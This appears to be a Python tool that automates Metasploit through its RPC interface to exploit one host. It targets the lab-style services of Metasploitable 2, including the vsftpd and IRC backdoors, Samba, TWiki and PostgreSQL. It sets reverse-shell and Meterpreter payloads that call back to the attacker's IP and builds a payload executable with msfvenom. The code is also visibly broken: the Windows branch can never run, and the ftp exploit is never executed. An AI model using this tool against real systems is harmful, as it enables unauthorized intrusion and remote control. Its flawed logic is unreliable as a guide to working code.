'''
WARNING TESTING & EDUCATIONAL PURPOSES ONLY
Single Computer and Port(s) exploit tool
'''
import socket
from pymetasploit3.msfrpc import *
from bs4 import BeautifulSoup
from os.path import exists
import os
from colorama import Fore, Back, Style
'''
NOTE
To set the below password you MUST load into command line
the following lines:

msfconsole
load msgrpc
Find the MSGRPC Password from that command
Input it HERE in the "MsfRpcClient('youpasswordhere',server="127.0.0.1", ssl = False)
currently 2201 exploits
'''

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
userIpAddress = s.getsockname()[0]
#client = MsfRpcClient('OpWogtmd',server="127.0.0.1", ssl = False)
#exploit_list = client.modules.exploits
#payload_list = client.modules.payloads

'''
userInputAttack = "127.0.0.1"
print(exploit_list[740])
exp = client.modules.use("exploit", exploit_list[368])
exp['RHOSTS'] = userInputAttack
print(exp.options)


i=0
for x in exploit_list:
    print(str(i) + ":" + x + "\n")
    i = i + 1
    if i > 700:
        break

'''

'''
print("AUXILLIARY EXPLOITS")
Auxilliary_exploit_list = client.modules.auxiliary
i = 0 
for x in Auxilliary_exploit_list:
    print(str(i) + ":" + x + "\n")
    i = i + 1

i=0
for x in exploit_list:
    print(str(i) + ":" + x + "\n")
    i = i + 1
    if i > 800:
        break
'''
'''
DO NOT TOUCH PLEASE
Designated exploits numbers
AUXILLARY mysql: 850 mysql_login port 3306
http://linux-hacking-guide.blogspot.com/2015/06/metasploitable2-hack-mysql-server-using.html
AUXILLARY ssh: 1027 ssh_login port 22
https://www.offensive-security.com/metasploit-unleashed/scanner-ssh-auxiliary-modules/

EXPLOIT ftp: 855 vsftpd_234_backdoor port 21
https://tsitsiflora.medium.com/exploiting-ftp-in-metasploitable-2-8230a53be5ce

EXPLOIT Apache: 1005 Apache exploit twiki_histroy port 80 aka http
https://www.hackingloops.com/metasploitable-2/

EXPLOIT Samba: 776 Samba exploit Rport 139
https://www.hackingloops.com/metasploitable-2/

EXPLOT IRC: 878 IRC exploit backdoor
https://www.hackingloops.com/metasploitable-2/


NOTES://

https://www.hackingarticles.in/comprehensive-guide-on-metasploitable-2/
'''

def exploitTest(userInputAttack, port, OSinput): 
    
    #Designate Client ENSURE PASSWORD IS ENTERED
    
    client = MsfRpcClient('OpWogtmd',server="127.0.0.1", ssl = False)
    #creates appropiate list
    exploit_list = client.modules.exploits
    payload_list = client.modules.payloads

    if OSinput == "Linux":
        if port == "ftp":
            exp = client.modules.use("exploit", exploit_list[855])
            exp['RHOSTS'] = userInputAttack
            exp['LHOSTS'] = userIpAddress
            y = bool(client.sessions.list)
            if(y):
                client.sessionkill()
                return(-1)
            else:
                client.sessionkill()
                return(1)  

        if port == "apache":
            exp = client.modules.use("exploit", exploit_list[1005])
            exp['RHOSTS'] = userInputAttack
            exp.execute()
            y = bool(client.sessions.list)
            if(y):
                client.sessionkill()
                return(-1)
            else:
                client.sessionkill()
                return(1)  

        if port == "samba":
            exp = client.modules.use("exploit", exploit_list[776])
            exp['RHOSTS'] = userInputAttack
            exp.execute()
            y = bool(client.sessions.list)
            if(y):
                client.sessionkill()
                return(-1)
            else:
                client.sessionkill()
                return(1)  
                
        if port == "IRC":
            exp = client.modules.use("exploit", exploit_list[878])
            exp['RHOSTS'] = userInputAttack
            exp = client.modules.use("payloads", "cmd/unix/reverse")
            exp['LHOST'] = userIpAddress
            exp.execute()
            y = bool(client.sessions.list)
            if(y):
                client.sessionkill()
                return(-1)
            else:
                client.sessionkill()
                return(1)
        if port == "php":
            exp = client.modules.use("exploit", exploit_list[605])
            exp['RHOSTS'] = userInputAttack
            exp.execute()
            y = bool(client.sessions.list)
            if(y):
                client.sessionkill()
                return(-1)
            else:
                client.sessionkill()
                return(1)
        if port == "java":
            exp = client.modules.use("exploit", exploit_list[740])
            exp['RHOSTS'] = userInputAttack
            exp.execute()
            y = bool(client.sessions.list)
            if(y):
                client.sessionkill()
                return(-1)
            else:
                client.sessionkill()
                return(1)    
        if port == "postgres":
            exp = client.modules.use("exploit", exploit_list[368])
            exp['RHOSTS'] = userInputAttack
            exp.execute()
            y = bool(client.sessions.list)
            if(y):
                client.sessionkill()
                return(-1)
            else:
                client.sessionkill()
                return(1)

        if OSinput == "windows":
            os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost=" + userIpAddress + " lport=8080 -f exe -o my_payload.exe")
            exp = client.modules.use("exploit", exploit_list[472])
            exp = client.modules.use("payload", "windows/meterpreter/reverse_tcp")
            exp['RHOSTS'] = userInputAttack
            exp['LHOST'] = userIpAddress
            exp['LPORT'] = "8080"
            y = bool(client.sessions.list)
            if(y):
                client.sessionkill()
                return(-1)
            else:
                client.sessionkill()
                return(1)  